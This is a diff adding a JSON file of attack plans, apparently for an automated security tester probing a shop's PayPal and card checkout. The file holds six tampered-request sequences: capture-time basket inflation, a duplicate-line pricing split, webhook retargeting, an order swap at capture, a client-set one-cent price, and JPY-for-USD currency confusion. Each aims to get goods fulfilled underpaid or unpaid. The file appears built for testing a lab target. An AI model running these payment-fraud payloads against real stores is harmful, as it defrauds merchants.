@@ -1,0 +1,253 @@
+{
+  "plans": [
+    {
+      "name": "Capture-time basket inflation",
+      "idea": "The capture handler may trust items supplied in the capture request instead of the stored, PayPal-approved basket.",
+      "expect": "Pay $49 for one hoodie but have the fulfilled order contain ten hoodies.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {},
+          "blockCapture": true,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
+          "body": {
+            "orderId": "{{b.shopOrderId}}",
+            "shopOrderId": "{{b.shopOrderId}}",
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 10
+              }
+            ]
+          },
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{b.shopOrderId}}",
+          "body": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        }
+      ]
+    },
+    {
+      "name": "Duplicate-line pricing split",
+      "idea": "Pricing may collapse duplicate SKUs by using only the first or a deduplicated line, while fulfilment may sum every duplicate line.",
+      "expect": "PayPal charges $49 for one hoodie, but fulfilment ships ten hoodies.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              },
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 9
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{b.shopOrderId}}",
+          "body": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        }
+      ]
+    },
+    {
+      "name": "Webhook retarget to a fresh order",
+      "idea": "The webhook handler may find the order solely through editable custom_id, invoice_id, or related order fields, without binding the legitimately signed capture to its original shop order.",
+      "expect": "The original $49 capture fulfils a second, otherwise unpaid shop order, producing another hoodie parcel.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              }
+            ]
+          },
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "webhook",
+          "event": "PAYMENT.CAPTURE.COMPLETED",
+          "edit": {
+            "resource.custom_id": "{{a.body.orderId}}",
+            "resource.invoice_id": "{{a.body.orderId}}",
+            "resource.supplementary_data.related_ids.order_id": "{{a.body.id}}"
+          },
+          "signed": true,
+          "times": 1
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{a.body.orderId}}",
+          "body": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        }
+      ]
+    },
+    {
+      "name": "Capture-endpoint order swap",
+      "idea": "The capture route may apply a PayPal capture to a shopOrderId supplied in its request body rather than the shop order server-side bound to the PayPal order in the path.",
+      "expect": "The legitimate captured PayPal order also marks a fresh unpaid shop order fulfilled, yielding a second hoodie.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              }
+            ]
+          },
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{legit.paypalOrderId}}/capture",
+          "body": {
+            "orderId": "{{a.body.orderId}}",
+            "shopOrderId": "{{a.body.orderId}}",
+            "captureId": "{{legit.captureId}}"
+          },
+          "times": 1,
+          "together": false,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{a.body.orderId}}",
+          "body": {},
+          "times": 1,
+          "together": false,
+          "save": "c"
+        }
+      ]
+    },
+    {
+      "name": "Card-route line-price trust",
+      "idea": "The separate card checkout may accept a client-supplied per-item priceCents or totalCents even though the PayPal route calculates prices from the catalogue.",
+      "expect": "Charge one cent through the card route while shipping the $49 hoodie.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/card",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1,
+                "priceCents": 1
+              }
+            ],
+            "email": "buyer@offline.example.com",
+            "card": {
+              "number": "4242424242424242",
+              "exp": "12/34",
+              "cvc": "123"
+            },
+            "totalCents": 1,
+            "amount": {
+              "currency_code": "USD",
+              "value": "0.01"
+            }
+          },
+          "times": 1,
+          "together": false,
+          "save": "a"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{a.body.orderId}}",
+          "body": {},
+          "times": 1,
+          "together": false,
+          "save": "b"
+        }
+      ]
+    },
+    {
+      "name": "Currency denomination confusion",
+      "idea": "Order creation may forward a client-selected currency to PayPal while the shop compares only the numeric amount 49.00 against its USD total.",
+      "expect": "Pay 49 JPY instead of 49 USD and still have the hoodie order fulfilled.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              }
+            ],
+            "currency": "JPY",
+            "currency_code": "JPY",
+            "currencyCode": "JPY",
+            "amount": {
+              "currency_code": "JPY",
+              "value": "49.00"
+            },
+            "purchase_units": [
+              {
+                "amount": {
+                  "currency_code": "JPY",
+                  "value": "49.00"
+                }
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "GET",
+          "path": "/api/orders/{{b.shopOrderId}}",
+          "body": {},
+          "times": 1,
+          "together": false,
+          "save": "a"
+        }
+      ]
+    }
+  ]
+}
